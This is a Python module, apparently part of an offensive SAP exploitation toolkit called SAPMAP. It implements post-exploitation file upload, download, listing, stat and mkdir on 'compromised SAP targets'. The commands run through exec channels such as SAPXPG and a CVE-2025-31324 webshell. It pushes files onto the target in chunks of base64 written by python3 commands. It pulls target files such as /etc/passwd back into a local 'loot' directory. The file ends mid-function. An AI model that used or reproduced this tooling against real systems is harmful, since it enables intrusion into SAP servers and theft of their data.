#!/usr/bin/env python3
"""sap_target_fs.py — unified filesystem interface for compromised SAP targets.

Issue #37 Phase 1: single module that provides ``upload / download /
list_dir / stat / mkdir`` on a target SAP application server through
any OS-exec channel SAPMAP has (GW SAPXPG, SXPG-authenticated,
CTCWebService, SAPControl, CVE-2025-31324 JSP webshell).  Every
transfer verifies integrity — MD5 round-trip on upload, byte-size
compare on download — so a silent SAPXPG PARAMS truncation or a
kernel-793 TLV cap doesn't leave a corrupted file on disk without
telling the operator.

Design goals:

1. **One class for the whole feature.**  All existing near-duplicates
   of "chunked base64 + python3/certutil decode" (see the survey in
   the issue #37 discussion for the 6+ copies) will get pointed at
   this in a follow-up refactor; for now it's additive.

2. **Channel-agnostic.**  Takes a caller-supplied ``exec_fn(program,
   args) -> {success, output, error}`` — same shape as
   :func:`sap_dpmon_sapstar.GwExecFn` and
   :func:`sap_pse_loot.GwExecFn`.  A convenience factory
   :func:`make_exec_fn_from_node` builds one from a
   :class:`SAPNode` + :class:`Credentials` by wrapping
   :func:`sapmap_exploit.execute_os_command` (which internally picks
   the best channel).

3. **Integrity always on.**  Every upload computes local MD5 →
   uploads → computes remote MD5 → hard-fails on mismatch.  Every
   download compares reassembled length vs the pre-fetched target
   file size.  Optional ``skip_integrity=True`` for one-off probes.

4. **PARAMS-budget aware.**  Chunk size is computed from the OS-side
   invocation form (bare python3, env-wrapped python3, cmd.exe
   echo) so we never overflow SAPXPG's 255-byte PARAMS field
   silently.  Reuses the same math the recent HANA writer fix
   introduced (:func:`sap_db_sql_writers._python3_split_spec`) —
   duplicated here as a small private helper so this module has no
   dependency on sap_db_sql_writers at import time.

5. **Cross-OS.**  ``os_family`` is detected from ``node.os_type`` at
   construction; each operation dispatches to Linux or Windows
   variants.  Phase 1 ships Linux fully implemented; Windows raises
   ``NotImplementedError`` with a clear message and lands in Phase 2.

6. **No exceptions on target errors.**  Returns
   ``{ok: bool, ...}`` dicts throughout — matches the rest of the
   SAPMAP post-ex modules.  Only genuine programming errors
   (bad argument types, mocks returning malformed dicts) raise.

The class holds no state beyond the (node, creds, exec_fn) triple
and a cached python3 spec after first use — no long-lived
sockets, no threads.  Safe to instantiate per-request from Bottle
handlers.
"""

from __future__ import annotations

import base64
import hashlib
import os
import re
import time
from typing import Callable, Optional


# Same shape as sap_dpmon_sapstar.GwExecFn / sap_pse_loot.GwExecFn.
# (program, args) -> {"success": bool, "output": list[str], "error": str}
ExecFn = Callable[[str, str], dict]


# SAPXPG PARAMS field size.  We reserve 5B for safety — see
# sap_db_sql_writers._write_hana_wrapper_via_gw for the full
# explanation of what a silent truncation costs (Julian's issue #8
# repro was exactly this).
_PARAMS_MAX = 255
_PARAMS_SAFETY = 5


# --------------------------------------------------------------------------
# python3 spec helpers
# --------------------------------------------------------------------------
#
# A "spec" is the python3 invocation string the caller wants used on
# the target — either a bare path ("/usr/bin/python3") or an
# env-wrapped form ("/usr/bin/env LD_LIBRARY_PATH=... /hana/.../
# python3") for HANA-shipped interpreters whose libpython3.X.so
# doesn't sit in ld.so.conf.  The caller passes this through so we
# don't have to re-probe on every upload/download call; higher-level
# code (the exploit orchestrator) already did the discovery once via
# sap_db_sql_writers._probe_python3_via_gw.  When no spec is given
# we default to "/usr/bin/python3" — works on 95%+ of modern SAP
# hosts, and the MD5 verify at the end will catch the case where it
# didn't.

def _split_python3_spec(spec: str) -> tuple:
    """Split ``spec`` into ``(program, args_prefix)`` for the
    (program, params) pair expected by ExecFn.

    Bare path::

        "/usr/bin/python3" → ("/usr/bin/python3", "")

    Env-wrapped for HANA-shipped python3::

        "/usr/bin/env LD_LIBRARY_PATH=/hana/... /hana/.../python3"
        → ("/usr/bin/env",
           "LD_LIBRARY_PATH=/hana/... /hana/.../python3")

    Callers concatenate the returned ``args_prefix`` (space-separated)
    in front of the python arguments when building the full PARAMS
    string.
    """
    if " " not in spec:
        return spec, ""
    first_space = spec.find(" ")
    return spec[:first_space], spec[first_space + 1:]


def _py3_chunk_size(python3_spec: str, tmp_path: str) -> int:
    """How many base64 characters we can pack into one chunk write
    without overflowing PARAMS.  Same formula as
    :func:`sap_db_sql_writers._write_hana_wrapper_via_gw` — kept in
    lock-step so bug fixes in either helper transfer trivially.
    """
    _cmd, prefix = _split_python3_spec(python3_spec)
    body_overhead = len(f"-c open('{tmp_path}','ab').write(b'')")
    prefix_overhead = (len(prefix) + 1) if prefix else 0
    return _PARAMS_MAX - prefix_overhead - body_overhead - _PARAMS_SAFETY


def _py3_params(python3_spec: str, python_args: str) -> tuple:
    """Build the (program, params) pair for ``exec_fn`` when running
    ``python3 <python_args>``.  Handles the env-wrap prefix transparently."""
    cmd, prefix = _split_python3_spec(python3_spec)
    params = f"{prefix} {python_args}" if prefix else python_args
    return cmd, params


# --------------------------------------------------------------------------
# TargetFS
# --------------------------------------------------------------------------

class TargetFS:
    """Filesystem interface for a compromised SAP target.

    Instantiate per-operation (cheap — no state beyond three refs
    plus a lazy python3 spec cache).  All public methods return a
    dict with an ``ok: bool`` key; callers should always branch on
    that rather than expecting exceptions.
    """

    def __init__(self, node, exec_fn: ExecFn,
                 os_family: Optional[str] = None,
                 python3_spec: Optional[str] = None,
                 label: str = ""):
        """
        Args:
          node: A :class:`SAPNode` — used only for label / logging;
                the exec channel is fully abstracted by ``exec_fn``.
          exec_fn: ``(program, args) -> {success, output, error}`` —
                the same shape as sap_dpmon_sapstar.GwExecFn.  Every
                target-side command flows through this.
          os_family: ``"linux"`` or ``"windows"``.  Auto-detected
                from ``node.os_type`` if not supplied.
          python3_spec: Either a bare path ("/usr/bin/python3") or
                an env-wrapped form ("/usr/bin/env LD_LIBRARY_PATH=...
                /hana/.../python3") for HANA-shipped interpreters.
                Only used on Linux targets.
          label: Prefix for every progress ``print`` line.  Defaults
                to the node's SID so multi-target sessions stay
                readable in the console.
        """
        self.node = node
        self.exec_fn = exec_fn
        self.os_family = (os_family or self._detect_os(node)).lower()
        if self.os_family not in ("linux", "windows"):
            self.os_family = "linux"
        # python3_spec is now lazy — probed on first upload via
        # _ensure_python3_spec.  Callers may pass an explicit spec
        # (tests do) to skip discovery.
        self.python3_spec = python3_spec
        self._python3_probed = python3_spec is not None
        self.label = label or getattr(node, "sid", "?")

    def _ensure_python3_spec(self) -> Optional[str]:
        """Lazy-probe a working python3 on the target.  Reuses the
        battle-tested probe from :mod:`sap_dpmon_sapstar` so we pick up
        HANA-shipped interpreters under
        ``/hana/shared/<HDB_SID>/exe/<arch>/hdb/Python3/bin/python3`` —
        same fix as Julian's issue #8.  Returns the resolved spec
        (bare path or env-wrapped) or ``None`` when no python3 exists
        on the target."""
        if self._python3_probed:
            return self.python3_spec
        try:
            from sap_dpmon_sapstar import _probe_python3_via_exec_fn
            sid = getattr(self.node, "sid", "?")
            spec = _probe_python3_via_exec_fn(self.exec_fn, sid=sid,
                                                label=self.label)
        except Exception as e:
            print(f"[-] {self.label}: python3 probe error: {e!r}")
            spec = None
        self.python3_spec = spec
        self._python3_probed = True
        return spec

    @staticmethod
    def _detect_os(node) -> str:
        """Guess Linux vs Windows from ``node.os_type``.  Falls back
        to Linux — most SAP application servers run Linux, and the
        Linux implementation errors cleanly against Windows targets
        (python3 probe fails, MD5 verify catches it)."""
        t = (getattr(node, "os_type", "") or "").lower()
        if any(w in t for w in ("windows", "nt", "win")):
            return "windows"
        return "linux"

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def upload(self, local_path: str, remote_path: str,
                skip_integrity: bool = False) -> dict:
        """Push a local file to the target.

        Returns::

            {
              ok:          bool,
              bytes:       int,    # local file size
              md5_local:   str,    # local MD5 hex
              md5_remote:  str,    # remote MD5 hex (empty if skip_integrity)
              elapsed:     float,  # seconds
              error:       str,    # populated when ok=False
              chunks:      int,    # number of chunks used
              chunk_size:  int,    # bytes per chunk (base64 pre-decode)
            }
        """
        t0 = time.time()
        try:
            with open(local_path, "rb") as fh:
                content = fh.read()
        except Exception as e:
            return {"ok": False, "error": f"local read failed: {e!r}"}
        md5_local = hashlib.md5(content).hexdigest()

        if self.os_family == "windows":
            return {"ok": False, "error": "Windows upload not yet "
                     "implemented — Phase 2 of issue #37"}

        # Linux path: chunked b64 write via python3 + b64decode + verify
        result = self._upload_linux(remote_path, content)
        result["bytes"] = len(content)
        result["md5_local"] = md5_local
        result["elapsed"] = round(time.time() - t0, 2)

        if not result.get("ok"):
            return result

        # Remote MD5 verify
        if skip_integrity:
            result["md5_remote"] = ""
            return result
        md5_remote = self._remote_md5_linux(remote_path)
        result["md5_remote"] = md5_remote
        if md5_remote and md5_remote != md5_local:
            result["ok"] = False
            result["error"] = (f"MD5 mismatch — local={md5_local} "
                                f"remote={md5_remote} — file corrupted "
                                f"in transit")
        elif not md5_remote:
            result["ok"] = False
            result["error"] = ("could not compute remote MD5 (md5sum "
                                "output unreadable via exec channel) "
                                "— cannot verify integrity")
        return result

    def download(self, remote_path: str,
                  loot_dir: Optional[str] = None,
                  loot_subdir: str = "fs",
                  max_size: int = 100 * 1024 * 1024) -> dict:
        """Fetch a file from the target and save it under ``loot/``.

        Args:
          remote_path: Absolute path on the target.
          loot_dir: Base loot directory.  When ``None`` uses the
                canonical ``sapmap_state.ensure_loot_dir(loot_subdir)``
                so the file lands under ``loot/fs/<sid>/<ts>/``.
                Pass an explicit path to force a specific location
                (used by tests + REST handler).
          loot_subdir: Subdirectory under ``loot/`` when
                ``loot_dir`` is None.
          max_size: Hard cap on the target file size (default 100 MB).
                Larger files fail cleanly — chunked reads over
                SAPXPG scale linearly with size and would spend
                hours before finishing on a multi-GB log.

        Returns::

            {
              ok:         bool,
              loot_path:  str,    # absolute path where bytes landed
              bytes:      int,    # transferred bytes
              md5:        str,    # of the fetched bytes
              elapsed:    float,
              error:      str,
            }
        """
        t0 = time.time()

        if self.os_family == "windows":
            return {"ok": False, "error": "Windows download not yet "
                     "implemented — Phase 2 of issue #37"}

        # Pre-flight: file size
        size_info = self.stat(remote_path)
        if not size_info.get("ok"):
            return {"ok": False, "error":
                     f"stat failed: {size_info.get('error', '?')}"}
        if not size_info.get("exists"):
            return {"ok": False, "error":
                     f"remote file does not exist: {remote_path}"}
        if size_info.get("is_dir"):
            return {"ok": False, "error":
                     f"remote path is a directory: {remote_path}"}
        size = size_info["size"]
        if size > max_size:
            return {"ok": False, "error":
                     f"file too large ({size} bytes > cap {max_size}) "
                     f"— pass a larger max_size to override"}
        if size == 0:
            # Empty file — no reading needed, just write an empty
            # loot file and return.  Chunked read would spin forever.
            loot_path = self._loot_path(remote_path, loot_dir, loot_subdir)
            with open(loot_path, "wb"):
                pass
            return {"ok": True, "loot_path": loot_path, "bytes": 0,
                     "md5": hashlib.md5(b"").hexdigest(),
                     "elapsed": round(time.time() - t0, 2)}

        # Chunked base64 read
        content = self._download_linux(remote_path, size)
        if content is None:
            return {"ok": False, "error":
                     "chunked read failed — see console output"}
        if len(content) != size:
            return {"ok": False, "error":
                     f"size mismatch after reassembly: "
                     f"got {len(content)} bytes, expected {size}"}

        loot_path = self._loot_path(remote_path, loot_dir, loot_subdir)
        with open(loot_path, "wb") as fh:
            fh.write(content)
        return {
            "ok":        True,
            "loot_path": loot_path,
            "bytes":     len(content),
            "md5":       hashlib.md5(content).hexdigest(),
            "elapsed":   round(time.time() - t0, 2),
        }

    def list_dir(self, remote_path: str) -> dict:
        """List the contents of a directory.  Returns::

            {
              ok:       bool,
              path:     str,
              entries:  [{name, size, is_dir, mtime, mode}, ...],
              error:    str,
            }
        """
        if self.os_family == "windows":
            return {"ok": False, "error": "Windows list_dir not yet "
                     "implemented — Phase 2 of issue #37",
                     "path": remote_path, "entries": []}
        return self._list_dir_linux(remote_path)

    def stat(self, remote_path: str) -> dict:
        """Get metadata for a single path.  Returns::

            {
              ok:      bool,
              exists:  bool,
              size:    int,
              is_dir:  bool,
              mtime:   str,   # ISO8601 or empty
              mode:    str,   # octal string or ls-style
              error:   str,
            }

        ``ok=True`` + ``exists=False`` is a valid response (target
        readback worked, file just isn't there).
        """
        if self.os_family == "windows":
            return {"ok": False, "error": "Windows stat not yet "
                     "implemented — Phase 2 of issue #37",
                     "exists": False}
        return self._stat_linux(remote_path)

    def mkdir(self, remote_path: str, parents: bool = True) -> dict:
        """Create a directory on the target.  Returns::

            {ok: bool, error: str}
        """
        if self.os_family == "windows":
            return {"ok": False, "error": "Windows mkdir not yet "
                     "implemented — Phase 2 of issue #37"}
        args = f"-p {remote_path}" if parents else remote_path
        r = self.exec_fn("/bin/mkdir", args)
        if r.get("success"):
            return {"ok": True, "error": ""}
        # mkdir non-zero → error stream carries the message
        err = " ".join(r.get("output", [])) or r.get("error", "?")
        return {"ok": False, "error": err[:200]}

    # ------------------------------------------------------------------
    # Linux implementations
    # ------------------------------------------------------------------

    def _upload_linux(self, remote_path: str, content: bytes) -> dict:
        """Chunked base64 write via python3 + b64decode.  Same recipe
        as ``sap_db_sql_writers._chunked_b64_write_via_python3`` — kept
        as a private method here so this module stays standalone."""
        # Probe python3 lazily so upload works on HANA hosts where
        # /usr/bin/python3 is absent but /hana/shared/<HDB_SID>/exe/.../
        # python3 exists.
        spec = self._ensure_python3_spec()
        if not spec:
            return {"ok": False,
                     "error": ("no python3 discovered on target — "
                               "upload requires python3 for chunked "
                               "base64 write.  Install python3 or "
                               "authenticate first."),
                     "chunks": 0, "chunk_size": 0}

        b64 = base64.b64encode(content).decode("ascii")
        b64_path = remote_path + ".b64"

        # Wipe stale
        self.exec_fn("/bin/rm", f"-f {remote_path} {b64_path}")

        # Chunk size derived from python3 spec length so env-wrapped
        # HANA python3 doesn't overflow PARAMS.
        chunk_size = _py3_chunk_size(self.python3_spec, b64_path)
        if chunk_size < 20:
            return {"ok": False,
                     "error": f"PARAMS budget exhausted — python3 "
                     f"spec + write body leave only {chunk_size}B "
                     f"for base64 chunk (need ≥20B)",
                     "chunks": 0, "chunk_size": chunk_size}

        chunks = [b64[i:i + chunk_size]
                   for i in range(0, len(b64), chunk_size)]
        for i, chunk in enumerate(chunks):
            mode = "wb" if i == 0 else "ab"
            body = f"-c open('{b64_path}','{mode}').write(b'{chunk}')"
            cmd, params = _py3_params(self.python3_spec, body)
            r = self.exec_fn(cmd, params)
            if not r.get("success"):
                self.exec_fn("/bin/rm", f"-f {b64_path}")
                return {"ok": False,
                         "error": f"chunk {i + 1}/{len(chunks)} "
                         f"failed at exec: {r.get('error', '?')}",
                         "chunks": i, "chunk_size": chunk_size}

        # Decode base64 → final file
        decode_body = (
            f"-c open('{remote_path}','wb').write("
            f"__import__('base64').b64decode(open('{b64_path}',"
            f"'rb').read()))")
        cmd, params = _py3_params(self.python3_spec, decode_body)
        r = self.exec_fn(cmd, params)
        if not r.get("success"):
            self.exec_fn("/bin/rm", f"-f {b64_path}")
            return {"ok": False,
                     "error": f"decode failed: {r.get('error', '?')}",
                     "chunks": len(chunks), "chunk_size": chunk_size}

        # Cleanup
        self.exec_fn("/bin/rm", f"-f {b64_path}")
        return {"ok": True, "error": "",
                 "chunks": len(chunks), "chunk_size": chunk_size}

    def _remote_md5_linux(self, remote_path: str) -> str:
        """Return the target's MD5 hex for ``remote_path`` (empty
        string on any failure — caller treats empty as "couldn't
        verify")."""
        # Try md5sum first (universal on Linux).  Output format:
        # "d41d8cd98f00b204e9800998ecf8427e  /tmp/foo"
        r = self.exec_fn("/usr/bin/md5sum", remote_path)
        for line in r.get("output", []):
            m = re.match(r"^([0-9a-f]{32})\s+", line.strip())
            if m:
                return m.group(1)
        # Fallback: openssl md5 -r (some minimal hosts don't have
        # md5sum but do ship openssl)
        r = self.exec_fn("/usr/bin/openssl", f"md5 -r {remote_path}")
        for line in r.get("output", []):
            m = re.match(r"^([0-9a-f]{32})\s+", line.strip())
            if m:
                return m.group(1)
        return ""

    def _download_linux(self, remote_path: str, size: int) -> Optional[bytes]:
        """Download a file from the target as base64.

        Strategy (tried in order — first success wins):

        1. ``/usr/bin/base64 <path>`` — universal on Linux (part of
           GNU coreutils, present on RHEL / SLES / Debian / hardened
           SAP appliances).  Single command, no python3 dependency.
           Base64 output naturally wraps at 76 chars/line so it
           survives the kernel-793 TLV ~128B/line cap without any
           slicing.  This is the fast path — works for the vast
           majority of downloads.

        2. python3 chunked read — same slicing pattern as
           :func:`sap_pse_loot._read_chunked`.  Only reached when
           /usr/bin/base64 is absent AND python3 was discovered by
           the probe.  Slices the file by byte offset and prints one
           b64-encoded chunk at a time, each small enough to survive
           TLV truncation.

        Returns the reassembled bytes, or ``None`` when both paths
        failed.  Prints diagnostic output on every intermediate
        failure so the operator can see which channel was tried.
        """
        # --- Path 1: /usr/bin/base64 (no python3 required) ------------
        # SAPXPG's stdout capture can silently drop the tail of long
        # outputs — a 76-char/line b64 stream from a multi-KB file
        # arrives short and the size-check catches it.  If instead
        # only INTERIOR lines are dropped, the total length is not a
        # multiple of 4 and decoding raises "Incorrect padding"; we
        # pad with '=' and retry with validate=False so the partial
        # data is still recovered and the size-check decides what to
        # do next.
        base64_paths = ("/usr/bin/base64", "/bin/base64",
                         "/usr/local/bin/base64")
        for b64_bin in base64_paths:
            r = self.exec_fn(b64_bin, remote_path)
            out_lines = r.get("output", [])
            if not out_lines:
                continue
            first_lo = out_lines[0].lower()
            if ("no such file" in first_lo or "cannot open" in first_lo
                    or "not found" in first_lo):
                # base64 binary present but the target file isn't
                print(f"[-] {self.label}: {b64_bin}: {out_lines[0].strip()}")
                continue
            b64_blob = "".join(out_lines)
            b64_clean = re.sub(r"[^A-Za-z0-9+/=]", "", b64_blob)
            if not b64_clean:
                continue
            # Pad to a multiple of 4 and use lenient decode — the
            # SAPXPG stream can drop bytes without warning.
            padded = b64_clean.rstrip("=") \
                + "=" * ((4 - len(b64_clean.rstrip("=")) % 4) % 4)
            try:
                decoded = base64.b64decode(padded, validate=False)
            except Exception as e:
                print(f"[-] {self.label}: {b64_bin} b64 decode error: "
                      f"{e!r} — trying next path")
                continue
            if len(decoded) == size:
                print(f"[+] {self.label}: downloaded via {b64_bin} "
                      f"({size} B, single-shot)")
                return decoded
            print(f"[-] {self.label}: {b64_bin} returned "
                  f"{len(decoded)} B, expected {size} — "
                  f"SAPXPG probably truncated stdout, falling back "
                  f"to python3 chunked read")
            break

        # --- Path 2: python3 chunked read ------------------------------
        spec = self._ensure_python3_spec()
        if not spec:
            print(f"[-] {self.label}: no /usr/bin/base64 AND no python3 "
                  f"— cannot download {remote_path}.  Install "
                  f"coreutils base64 or python3 on the target.")
            return None

        # 72 raw bytes → 96 base64 chars, safely under the 128B TLV
        # ceiling most kernels enforce.  Same value used by
        # sap_pse_loot for the same reason.
        RAW_CHUNK = 72
        # Emit progress at ~10 evenly-spaced points so a multi-MB
        # download doesn't look wedged.
        n_chunks = (size + RAW_CHUNK - 1) // RAW_CHUNK
        progress_every = max(1, n_chunks // 10)
        print(f"[*] {self.label}: chunked download of {remote_path} "
              f"({size} B, {n_chunks} chunks of {RAW_CHUNK} B via {spec})")
        parts = []
        offset = 0
        chunk_idx = 0
        while offset < size:
            end = min(offset + RAW_CHUNK, size)
            # Use print() not sys.stdout.write() — print() auto-flushes
            # via the atexit handler even when the subprocess is
            # killed early by SAPXPG timeouts (Julian's issue #8
            # showed sys.stdout.write() silently losing output when
            # sapxpg dropped the child mid-flight).
            body = (f"-c "
                     f"print(__import__('base64').b64encode("
                     f"open('{remote_path}','rb').read()[{offset}:{end}]"
                     f").decode())")
            cmd, params = _py3_params(spec, body)
            r = self.exec_fn(cmd, params)
            b64_blob = "".join(r.get("output", []))
            b64_clean = re.sub(r"[^A-Za-z0-9+/=]", "", b64_blob)
            if not b64_clean:
                # First-chunk empty is worth diagnosing: dump the raw
                # output list so the operator can see whether python3
                # crashed with a permission error, exec channel died,
                # etc.  Without this the failure looks like a mystery.
                raw = r.get("output", [])
                err = r.get("error", "")
                print(f"[-] {self.label}: chunk at offset {offset} "
                      f"returned empty — download aborted")
                print(f"[-] {self.label}:   exec success={r.get('success')} "
                      f"error={err[:120]!r}")
                print(f"[-] {self.label}:   raw output lines "
                      f"({len(raw)}): "
                      f"{[l[:80] for l in raw[:3]]}")
                # Try to help the operator: verify python3 is actually
                # runnable by running a trivial print.
                probe = self.exec_fn(cmd, "-c print(42)")
                probe_out = probe.get("output", [])
                if not any("42" in ln for ln in probe_out):
                    print(f"[-] {self.label}:   python3 probe "
                          f"'print(42)' also failed — interpreter "
                          f"unusable via this channel.  Try SXPG "
                          f"(create credentials + escalate first).")
                else:
                    print(f"[-] {self.label}:   python3 probe "
                          f"'print(42)' succeeded — likely a read "
                          f"permission issue on {remote_path} for "
                          f"the exec channel's user (<sid>adm).")
                return None
            # Lenient decode — pad to multiple of 4 first
            padded = b64_clean.rstrip("=") \
                + "=" * ((4 - len(b64_clean.rstrip("=")) % 4) % 4)
            try:
                parts.append(base64.b64decode(padded, validate=False))
            except Exception as e:
                print(f"[-] {self.label}: chunk at offset {offset} "
                      f"b64 decode failed: {e!r}")
                return None
            offset = end
            chunk_idx += 1
            if chunk_idx == 1 or chunk_idx == n_chunks \
                    or chunk_idx % progress_every == 0:
                pct = (chunk_idx * 100) // n_chunks
                print(f"[*] {self.label}: chunk {chunk_idx}/{n_chunks} "
                      f"({pct}%) — {end}/{size} B")
        return b"".join(parts)

    def _list_dir_linux(self, remote_path: str) -> dict:
        """Parse a directory listing.

        Three strategies are tried in order — the first one that
        returns parseable output wins:

        1. ``ls -la --time-style=+%Y-%m-%dT%H:%M:%S <path>`` — GNU
           coreutils with ISO-style timestamps.
        2. ``ls -la <path>`` — bare ``-la`` for BSD ls / minimal
           busybox where ``--time-style`` may error out.
        3. ``find <path> -maxdepth 1 -mindepth 1 -printf "..."`` — the
           SAPXPG-friendly fallback.  ``ls -la`` output on populous
           dirs (/tmp, /etc, /var/log) routinely overflows SAPXPG's
           stdout capture and the entire response comes back empty.
           ``find -printf`` produces a much tighter one-line-per-entry
           format (~40 B/entry vs ~80 for ls) that fits under the
           buffer cap, and %f gives the basename only so filenames
           with spaces or absolute paths (single-file listing case)
           don't confuse downstream path-joining.

        Special case: if ``remote_path`` turns out to be a file (not
        a directory), a single-entry result is returned so the UI
        can offer the file for download.

        Result entries are deduplicated by (name, mode, size).
        SAPXPG on kernel 793+ echoes each stdout line twice (P3 + P4
        TLV frames), which would otherwise show every entry twice.
        """
        # Short-circuit: if path is a file, stat it and return a
        # single entry — /etc/passwd and friends land here when the
        # operator types the full file path in the address bar.
        st = self._stat_linux(remote_path)
        if st.get("ok") and st.get("exists") and not st.get("is_dir"):
            basename = os.path.basename(remote_path.rstrip("/")) \
                        or remote_path
            return {"ok": True, "path": remote_path,
                     "entries": [{
                        "name":   basename,
                        "size":   st.get("size", 0),
                        "is_dir": False,
                        "mtime":  st.get("mtime", ""),
                        "mode":   st.get("mode", ""),
                        # Preserve the absolute path for the UI so
                        # the download button doesn't try to join.
                        "abs_path": remote_path,
                     }],
                     "error": ""}

        r = self.exec_fn("/bin/ls",
                          f"-la --time-style=+%Y-%m-%dT%H:%M:%S "
                          f"{remote_path}")
        lines = r.get("output", []) or []

        # Detect "no such file" in the first line before deciding to
        # retry — no point re-running an ls that will fail the same
        # way.
        if lines:
            first = lines[0].lower()
            if "cannot access" in first or "no such" in first:
                return {"ok": False, "path": remote_path,
                         "entries": [], "error": lines[0].strip()}

        # Retry with bare -la when nothing came back or when parsing
        # yields zero entries (BSD ls silently ignores --time-style
        # on some builds; SAPXPG can drop the whole output on others).
        needs_retry = (not lines) or all(
            _parse_ls_line(l) is None for l in lines
        )
        if needs_retry:
            r2 = self.exec_fn("/bin/ls", f"-la {remote_path}")
            lines2 = r2.get("output", []) or []
            if lines2:
                first2 = lines2[0].lower()
                if "cannot access" in first2 or "no such" in first2:
                    return {"ok": False, "path": remote_path,
                             "entries": [],
                             "error": lines2[0].strip()}
                lines = lines2

        # --- Strategy 3: find -printf (SAPXPG-friendly compact) -----
        # Kicks in when both ls variants produced zero parseable
        # entries (very common on /tmp, /etc, /var/log with dozens
        # or hundreds of entries).  _list_dir_via_find returns None
        # for "nothing came back" — we treat that as "keep trying".
        need_find = (not lines) or all(
            _parse_ls_line(l) is None for l in lines
        )
        if need_find:
            find_entries = self._list_dir_via_find(remote_path)
            if find_entries:  # non-empty list
                return {"ok": True, "path": remote_path,
                         "entries": find_entries, "error": ""}

            # --- Strategy 4: ls -1a (names only — last resort) ------
            ls1_entries = self._list_dir_via_ls1(remote_path)
            if ls1_entries:
                return {"ok": True, "path": remote_path,
                         "entries": ls1_entries, "error": ""}

        if not lines:
            return {"ok": False, "path": remote_path, "entries": [],
                     "error": (f"ls / find / ls -1a all returned no "
                               f"parseable output for {remote_path} "
                               f"— the exec channel dropped its "
                               f"stdout.  Check the console for the "
                               f"raw output diagnostics.")}

        entries = []
        seen = set()
        for line in lines:
            e = _parse_ls_line(line)
            if not e:
                continue
            key = (e["name"], e.get("mode", ""), e.get("size", -1))
            if key in seen:
                continue
            seen.add(key)
            entries.append(e)
        return {"ok": True, "path": remote_path, "entries": entries,
                 "error": ""}

    def _list_dir_via_find(self, remote_path: str) -> Optional[list]:
        """SAPXPG-friendly directory listing via ``find -printf``.

        Format::

            <type>|<mode_octal>|<size>|<mtime_iso>|<basename>

        e.g. ``f|0644|1234|2026-08-20T09:00:00|hosts``.  Pipe as
        separator so filenames with spaces survive.  Basename only
        (%f) so absolute paths never leak into the entry name.

        Returns:
            list of entry dicts on success (empty list == empty dir),
            or None when find is unavailable / stdout still dropped
            / nothing parseable came back.
        """
        printf_fmt = ("%y|%m|%s|%TY-%Tm-%TdT%TH:%TM:%TS|%f\\n")
        for find_bin in ("/usr/bin/find", "/bin/find"):
            r = self.exec_fn(find_bin,
                              f"{remote_path} -maxdepth 1 -mindepth 1 "
                              f"-printf {printf_fmt}")
            lines = r.get("output", []) or []
            if not lines:
                # Try next find location
                continue
            first_lo = lines[0].lower()
            if ("no such" in first_lo or "cannot" in first_lo
                    or "not a directory" in first_lo):
                continue

            entries = []
            seen = set()
            for line in lines:
                s = line.rstrip()
                if not s or "|" not in s:
                    continue
                parts = s.split("|", 4)
                if len(parts) < 5:
                    continue
                ftype, mode, size_str, mtime, name = parts
                if name in (".", ".."):
                    continue
                try:
                    size = int(size_str)
                except ValueError:
                    continue
                key = (name, mode, size)
                if key in seen:
                    continue
                seen.add(key)
                entries.append({
                    "name":   name,
                    "size":   size,
                    "is_dir": ftype == "d",
                    "mtime":  mtime,
                    "mode":   mode,
                })
            if entries:
                print(f"[*] {self.label}: find fallback → "
                      f"{len(entries)} entries in {remote_path}")
                return entries
            # find returned lines but nothing parsed.  Log the first
            # few for diagnostics — usually means SAPXPG mangled the
            # `\n` in -printf so all entries came back concatenated
            # on one line.
            print(f"[-] {self.label}: find returned "
                  f"{len(lines)} lines but no parseable entries — "
                  f"raw sample: {[l[:80] for l in lines[:2]]}")
            return None
        return None

    def _list_dir_via_ls1(self, remote_path: str) -> Optional[list]:
        """Last-resort: ``ls -1a`` names-only listing.

        No metadata (size / mode / mtime shown as blank), but at
        <20 B/entry it survives even a heavily-buffered SAPXPG
        stdout channel.  Used when both ls -la AND find failed to
        return anything parseable.  The file browser degrades
        gracefully — folders vs files are re-checked via stat
        when the operator navigates into one.
        """
        r = self.exec_fn("/bin/ls", f"-1a {remote_path}")
        lines = r.get("output", []) or []
        if not lines:
            return None
        first_lo = lines[0].lower()
        if "no such" in first_lo or "cannot" in first_lo:
            return None
        entries = []
        seen = set()
        for line in lines:
            name = line.strip()
            if not name or name in (".", ".."):
                continue
            # ls -1 can also emit summary lines on some builds; skip
            # anything with whitespace inside.
            if " " in name or "\t" in name:
                continue
            if name in seen:
                continue
            seen.add(name)
            # Best-effort is_dir guess: trailing slash if present.
            is_dir = name.endswith("/")
            entries.append({
                "name":   name.rstrip("/"),
                "size":   0,
                "is_dir": is_dir,
                "mtime":  "",
                "mode":   "",
            })
        if entries:
            print(f"[*] {self.label}: ls -1a last-resort fallback → "
                  f"{len(entries)} entries in {remote_path} "
                  f"(no metadata — dir/file inferred on navigate)")
            return entries
        return None

    def _stat_linux(self, remote_path: str) -> dict:
        """Read size / mtime / mode / is_dir via ``stat -c``.

        Output format: ``<size>|<mtime>|<mode_octal>|<type>``
        where type is 'directory', 'regular file', 'symbolic link'.
        """
        fmt = "%s|%y|%a|%F"
        r = self.exec_fn("/usr/bin/stat", f"-c {fmt} {remote_path}")
        lines = r.get("output", [])
        for line in lines:
            s = line.strip()
            lo = s.lower()
            if "cannot stat" in lo or "no such" in lo:
                return {"ok": True, "exists": False, "size": 0,
                         "is_dir": False, "mtime": "", "mode": "",
                         "error": ""}
            parts = s.split("|")
            if len(parts) >= 4:
                try:
                    size = int(parts[0])
                except ValueError:
                    continue
                mtime = parts[1]
                mode = parts[2]
                ftype = parts[3].lower()
                return {"ok": True, "exists": True, "size": size,
                         "is_dir": "directory" in ftype,
                         "mtime": mtime, "mode": mode, "error": ""}
        return {"ok": False, "exists": False, "size": 0,
                 "is_dir": False, "mtime": "", "mode": "",
                 "error": "stat output unreadable — check exec channel "
                          "P3/P4 stdout capture on this kernel"}

    # ------------------------------------------------------------------
    # Loot path helpers
    # ------------------------------------------------------------------

    def _loot_path(self, remote_path: str,
                    loot_dir: Optional[str], loot_subdir: str) -> str:
        """Compose a safe local loot path for a downloaded remote file.

        Strategy: ``loot/<subdir>/<sid>/<yyyymmdd_hhmmss>/<basename>``.
        The timestamp ensures multiple downloads of the same file
        don't clobber each other.  ``basename`` is sanitised —
        strips any path separators the remote might have snuck in.
        """
        if loot_dir is None:
            try:
                from sapmap_state import ensure_loot_dir
                base = ensure_loot_dir(loot_subdir)
            except Exception:
                base = os.path.join(os.getcwd(), "loot", loot_subdir)
